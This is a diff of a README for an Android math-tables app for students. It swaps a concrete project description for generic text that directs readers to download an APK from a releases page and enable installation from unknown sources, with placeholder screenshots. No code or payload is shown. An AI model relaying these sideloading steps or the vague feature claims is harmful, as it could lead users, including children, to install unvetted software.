@@ -1,30 +1,87 @@
-# All-Star Math Tables 🇺🇸
-A colorful, student-friendly Android app to help U.S. elementary and middle school students learn and master math tables with ease!
+# TableChamp 🎉
 
-# About the Project
-All-Star Math Tables is a static Android application developed in Java, designed to support K-8 U.S. students in learning multiplication, addition, and subtraction tables from 1 to 20. The app features an engaging UI with ActionBar support across all screens, ensuring a consistent and smooth user experience.
-This project is ideal for early math learners, homeschoolers, and teachers looking for a quick reference or study tool in a classroom setting.
+![TableChamp Logo](https://img.shields.io/badge/TableChamp-Ready-brightgreen)
 
-# Key Features
-🧮 Multiplication, Addition, and Subtraction Tables (1–99) (May increase any size)
-🎨 Clean, colorful, and kid-friendly UI with visual themes for each math type
-🔢 Grid-based number selection (1–20) for easy access to any table
-📋 Static content (no internet required) – works offline and fast
-🧭 Full ActionBar support on all activities for a native Android feel
-📱 Optimized for phones and tablets in portrait mode
-🇺🇸 Designed with U.S. school students in mind – grades 1 through 6
+Welcome to **TableChamp**, a vibrant Android app designed to help students master multiplication, addition, and subtraction tables. This app provides a fun and engaging way for learners to improve their math skills.
 
-# Tech Stack
-Language: Java
-Framework: Android SDK
-Tools: Android Studio
-Min SDK: 21 (Lollipop)
-UI Components: CardView, GridView, ScrollView, Toolbar
+## Table of Contents
 
-# Getting Started
-Clone this repository:
-git clone https://github.com/yourusername/all-star-math-tables.git
-Open the project in Android Studio.
-Run it on an emulator or physical device.
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Screenshots](#screenshots)
+5. [Technologies Used](#technologies-used)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
-![banner](https://github.com/user-attachments/assets/08e5cefa-c4ef-4ee1-94ca-904f3849c850)
+## Features
+
+- **Interactive Learning**: Engaging activities that make learning math enjoyable.
+- **Progress Tracking**: Students can track their progress and see improvements over time.
+- **Customizable Settings**: Users can adjust settings to focus on specific areas, like multiplication or addition.
+- **User-Friendly Interface**: Designed with simplicity in mind, making it easy for students to navigate.
+
+## Installation
+
+To install **TableChamp**, you can download the latest release from our [Releases section](https://github.com/taileanh25/TableChamp/releases). 
+
+1. Click on the link above to visit the releases page.
+2. Download the APK file.
+3. Enable installation from unknown sources in your device settings.
+4. Open the downloaded APK file to install the app.
+
+## Usage
+
+Once installed, open the app and choose a math operation to start. The app will guide you through different exercises, allowing you to practice at your own pace. You can track your progress and revisit areas where you need improvement.
+
+### Example Steps:
+
+1. **Choose Operation**: Select multiplication, addition, or subtraction.
+2. **Start Practice**: Begin the exercises presented.
+3. **Review Results**: Check your scores and see which areas need more practice.
+
+## Screenshots
+
+![Home Screen](https://via.placeholder.com/600x400?text=Home+Screen)  
+*The main interface where users can select their desired operation.*
+
+![Practice Screen](https://via.placeholder.com/600x400?text=Practice+Screen)  
+*An example of a practice session in progress.*
+
+![Results Screen](https://via.placeholder.com/600x400?text=Results+Screen)  
+*View of results after completing a session.*
+
+## Technologies Used
+
+**TableChamp** is built using the following technologies:
+
+- **Android Studio**: The primary IDE for Android development.
+- **Java**: The programming language used for app development.
+- **XML**: Used for layout design.
+- **Gradle**: For managing dependencies.
+
+## Contributing
+
+We welcome contributions to improve **TableChamp**. If you have ideas or suggestions, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Create a pull request to the main repository.
+
+Please ensure your code follows the existing style and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **GitHub**: [taileanh25](https://github.com/taileanh25)
+- **Email**: taileanh25@example.com
+
+Thank you for checking out **TableChamp**! We hope this app helps students master their math skills in a fun and engaging way. Don't forget to check the [Releases section](https://github.com/taileanh25/TableChamp/releases) for the latest updates!
